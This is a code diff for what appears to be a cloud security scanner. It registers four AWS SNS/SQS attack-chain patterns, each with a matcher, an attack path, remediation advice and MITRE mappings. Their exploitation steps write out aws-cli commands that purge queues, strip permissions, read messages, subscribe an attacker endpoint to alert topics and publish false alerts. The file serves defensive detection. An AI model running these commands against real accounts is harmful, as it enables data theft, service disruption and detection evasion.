@@ -1374,6 +1374,122 @@ PATTERN_REGISTRY.register(
 )
 
 
+def _match_messaging_sns_sqs_unauth_exfil(
+    findings_by_skill: Dict[str, List[Finding]],
+    resource_index: Dict[str, List[Finding]],
+    evidence_by_skill: Dict[str, Any],
+) -> bool:
+    msg_findings = findings_by_skill.get("messaging", [])
+    ids = {f.id for f in msg_findings}
+    return bool({"MSG-005", "MSG-007", "MSG-008"}.intersection(ids))
+
+
+def _messaging_sns_sqs_unauth_exfil_attack_path(_: Dict[str, Any]) -> List[str]:
+    return [
+        "Attacker discovers permissive SNS topic and/or SQS queue policies",
+        "Creates unauthorized subscription or injects/reads queue messages",
+        "Exfiltrates message payloads and abuses trusted event workflows",
+    ]
+
+
+def _messaging_sns_sqs_unauth_exfil_remediation(_: Dict[str, Any]) -> List[str]:
+    return [
+        "Eliminate wildcard principals on sns:Publish/sns:Subscribe and SQS data-plane actions",
+        "Add strict SourceArn/SourceAccount conditions for service integrations",
+        "Continuously monitor policy changes and subscription drift",
+    ]
+
+
+PATTERN_REGISTRY.register(
+    DynamicCorrelationPattern(
+        id="messaging_sns_sqs_unauth_exfiltration_chain",
+        name="SNS/SQS Unauthenticated Exfiltration Chain",
+        description="Permissive SNS/SQS policies can enable unauthorized subscribe/publish/receive paths for data exfiltration.",
+        severity="Critical",
+        skills_required=["messaging"],
+        matcher=_match_messaging_sns_sqs_unauth_exfil,
+        attack_path_generator=_messaging_sns_sqs_unauth_exfil_attack_path,
+        remediation_generator=_messaging_sns_sqs_unauth_exfil_remediation,
+        threat_context=ThreatContext(
+            mitre_attack_tactics=["TA0009", "TA0010"],
+            mitre_attack_techniques=["T1020", "T1557"],
+            observed_in_wild=True,
+            exploit_maturity="Functional",
+        ),
+        exploitability=ExploitabilityInfo(
+            exploitation_steps=[
+                "aws sns list-topics && aws sns get-topic-attributes --topic-arn <arn>",
+                "aws sqs list-queues && aws sqs get-queue-attributes --queue-url <url> --attribute-names Policy",
+                "aws sns subscribe / aws sqs receive-message",
+            ],
+            tools_required=["aws-cli"],
+            exploitation_complexity="Low",
+            estimated_time_to_compromise="25 minutes",
+        ),
+        amplification_factor=1.6,
+    )
+)
+
+
+def _match_messaging_queue_destruction_disruption(
+    findings_by_skill: Dict[str, List[Finding]],
+    resource_index: Dict[str, List[Finding]],
+    evidence_by_skill: Dict[str, Any],
+) -> bool:
+    msg_findings = findings_by_skill.get("messaging", [])
+    iam_findings = findings_by_skill.get("iam", [])
+    has_open_messaging = any(f.id in {"MSG-005", "MSG-008"} for f in msg_findings)
+    has_destructive_iam = any(f.id in {"IAM-038", "IAM-039"} for f in iam_findings)
+    return has_open_messaging and has_destructive_iam
+
+
+def _messaging_queue_destruction_attack_path(_: Dict[str, Any]) -> List[str]:
+    return [
+        "Attacker abuses broad messaging and IAM mutation/destruction permissions",
+        "Deletes/purges queues or removes permissions to disrupt message-driven workloads",
+        "Causes sustained delivery failures and service degradation",
+    ]
+
+
+def _messaging_queue_destruction_remediation(_: Dict[str, Any]) -> List[str]:
+    return [
+        "Remove destructive queue/topic operations from non-emergency roles",
+        "Harden messaging resource policies and lock down admin APIs",
+        "Alert on queue purge/delete and policy-removal operations",
+    ]
+
+
+PATTERN_REGISTRY.register(
+    DynamicCorrelationPattern(
+        id="messaging_queue_destruction_disruption_chain",
+        name="Messaging Queue Destruction/Disruption Chain",
+        description="Combined permissive messaging access and destructive IAM permissions can trigger high-impact service disruption.",
+        severity="Critical",
+        skills_required=["messaging", "iam"],
+        matcher=_match_messaging_queue_destruction_disruption,
+        attack_path_generator=_messaging_queue_destruction_attack_path,
+        remediation_generator=_messaging_queue_destruction_remediation,
+        threat_context=ThreatContext(
+            mitre_attack_tactics=["TA0040", "TA0005"],
+            mitre_attack_techniques=["T1485", "T1562"],
+            observed_in_wild=False,
+            exploit_maturity="Proof-of-Concept",
+        ),
+        exploitability=ExploitabilityInfo(
+            exploitation_steps=[
+                "aws sqs purge-queue --queue-url <url>",
+                "aws sqs remove-permission --queue-url <url> --label <label>",
+                "aws sns remove-permission --topic-arn <arn> --label <label>",
+            ],
+            tools_required=["aws-cli"],
+            exploitation_complexity="Medium",
+            estimated_time_to_compromise="35 minutes",
+        ),
+        amplification_factor=1.75,
+    )
+)
+
+
 def _match_kms_policy_backdoor(
     findings_by_skill: Dict[str, List[Finding]],
     resource_index: Dict[str, List[Finding]],
@@ -2597,6 +2713,119 @@ PATTERN_REGISTRY.register(
             tools_required=["curl", "aws-cli"],
             exploitation_complexity="Low",
             estimated_time_to_compromise="20 minutes",
+        ),
+        amplification_factor=1.5,
+    )
+)
+
+
+def _match_alerting_sns_subscription_exfil_chain(
+    findings_by_skill: Dict[str, List[Finding]],
+    resource_index: Dict[str, List[Finding]],
+    evidence_by_skill: Dict[str, Any],
+) -> bool:
+    alert_findings = findings_by_skill.get("alerting", [])
+    ids = {f.id for f in alert_findings}
+    return bool({"ALRT-023", "ALRT-024"}.intersection(ids))
+
+
+def _alerting_sns_subscription_exfil_attack_path(_: Dict[str, Any]) -> List[str]:
+    return [
+        "Attacker identifies permissive SNS alert topic subscription controls",
+        "Adds unauthorized endpoint subscription to capture alert payloads",
+        "Uses leaked security telemetry to evade detection and incident response",
+    ]
+
+
+def _alerting_sns_subscription_exfil_remediation(_: Dict[str, Any]) -> List[str]:
+    return [
+        "Restrict sns:Subscribe and subscription protocols on alert topics",
+        "Continuously review and alert on unexpected subscriptions",
+        "Use approved, controlled subscriber endpoints only",
+    ]
+
+
+PATTERN_REGISTRY.register(
+    DynamicCorrelationPattern(
+        id="alerting_sns_subscription_exfiltration_chain",
+        name="Alerting SNS Subscription Exfiltration Chain",
+        description="Permissive subscription controls on alert topics can leak security telemetry to unauthorized endpoints.",
+        severity="High",
+        skills_required=["alerting"],
+        matcher=_match_alerting_sns_subscription_exfil_chain,
+        attack_path_generator=_alerting_sns_subscription_exfil_attack_path,
+        remediation_generator=_alerting_sns_subscription_exfil_remediation,
+        threat_context=ThreatContext(
+            mitre_attack_tactics=["TA0009", "TA0005"],
+            mitre_attack_techniques=["T1020", "T1562"],
+            observed_in_wild=False,
+            exploit_maturity="Proof-of-Concept",
+        ),
+        exploitability=ExploitabilityInfo(
+            exploitation_steps=[
+                "aws sns list-topics",
+                "aws sns subscribe --topic-arn <topic> --protocol https --notification-endpoint <attacker-endpoint>",
+                "Observe alert traffic out-of-band",
+            ],
+            tools_required=["aws-cli"],
+            exploitation_complexity="Low",
+            estimated_time_to_compromise="20 minutes",
+        ),
+        amplification_factor=1.45,
+    )
+)
+
+
+def _match_alerting_sns_publish_spoofing_chain(
+    findings_by_skill: Dict[str, List[Finding]],
+    resource_index: Dict[str, List[Finding]],
+    evidence_by_skill: Dict[str, Any],
+) -> bool:
+    alert_findings = findings_by_skill.get("alerting", [])
+    return any(f.id == "ALRT-022" for f in alert_findings)
+
+
+def _alerting_sns_publish_spoofing_attack_path(_: Dict[str, Any]) -> List[str]:
+    return [
+        "Attacker abuses broad sns:Publish permissions on alert topics",
+        "Injects noisy/false alerts to desensitize monitoring workflows",
+        "Masks malicious activity during detection fatigue window",
+    ]
+
+
+def _alerting_sns_publish_spoofing_remediation(_: Dict[str, Any]) -> List[str]:
+    return [
+        "Restrict sns:Publish to explicit service principals and expected sources",
+        "Enforce aws:SourceArn/aws:SourceAccount in topic policies",
+        "Alert on unusual publish patterns and sender identities",
+    ]
+
+
+PATTERN_REGISTRY.register(
+    DynamicCorrelationPattern(
+        id="alerting_sns_publish_spoofing_chain",
+        name="Alerting SNS Publish Spoofing Chain",
+        description="Broad publish permissions on alert topics allow spoofing/noise injection that degrades detection quality.",
+        severity="Critical",
+        skills_required=["alerting"],
+        matcher=_match_alerting_sns_publish_spoofing_chain,
+        attack_path_generator=_alerting_sns_publish_spoofing_attack_path,
+        remediation_generator=_alerting_sns_publish_spoofing_remediation,
+        threat_context=ThreatContext(
+            mitre_attack_tactics=["TA0005"],
+            mitre_attack_techniques=["T1562"],
+            observed_in_wild=False,
+            exploit_maturity="Proof-of-Concept",
+        ),
+        exploitability=ExploitabilityInfo(
+            exploitation_steps=[
+                "aws sns publish --topic-arn <topic> --message <noise>",
+                "Generate sustained alert noise to obscure true incidents",
+                "Execute malicious actions during alert fatigue",
+            ],
+            tools_required=["aws-cli"],
+            exploitation_complexity="Low",
+            estimated_time_to_compromise="15 minutes",
         ),
         amplification_factor=1.5,
     )
